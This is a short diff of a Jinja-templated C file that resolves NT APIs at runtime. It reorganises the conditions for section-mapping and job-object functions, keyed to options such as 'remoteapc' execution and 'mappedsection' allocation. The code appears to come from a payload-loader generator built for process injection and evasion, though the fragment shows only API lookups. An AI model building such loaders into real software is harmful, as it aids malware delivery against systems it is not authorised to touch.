@@ -159,11 +159,14 @@ void ResolveAPIs() {
     pfnRtlZeroMemory = (pRtlZeroMemory)pfnGetProcAddress(hNtdll, "RtlZeroMemory");
 
     {% if execution_method == 'remoteapc' or allocation_method == 'mappedsection' %}
-    pfnNtCreateSection = (pNtCreateSection)pfnGetProcAddress(hNtdll, "NtCreateSection");
-    pfnNtMapViewOfSection = (pNtMapViewOfSection)pfnGetProcAddress(hNtdll, "NtMapViewOfSection");
-    pfnNtCreateJobObject = (pNtCreateJobObject)pfnGetProcAddress(hNtdll, "NtCreateJobObject");
-    pfnNtSetInformationJobObject = (pNtSetInformationJobObject)pfnGetProcAddress(hNtdll, "NtSetInformationJobObject");
-    pfnNtAssignProcessToJobObject = (pNtAssignProcessToJobObject)pfnGetProcAddress(hNtdll, "NtAssignProcessToJobObject");
+        pfnNtCreateSection = (pNtCreateSection)pfnGetProcAddress(hNtdll, "NtCreateSection");
+        pfnNtMapViewOfSection = (pNtMapViewOfSection)pfnGetProcAddress(hNtdll, "NtMapViewOfSection");
+    {% endif %}
+
+    {% if execution_method == 'remoteapc' %}
+        pfnNtCreateJobObject = (pNtCreateJobObject)pfnGetProcAddress(hNtdll, "NtCreateJobObject");
+        pfnNtSetInformationJobObject = (pNtSetInformationJobObject)pfnGetProcAddress(hNtdll, "NtSetInformationJobObject");
+        pfnNtAssignProcessToJobObject = (pNtAssignProcessToJobObject)pfnGetProcAddress(hNtdll, "NtAssignProcessToJobObject");
     {% endif %}
 
     {% if bytecode_compression == 'mszip_compressor' %}
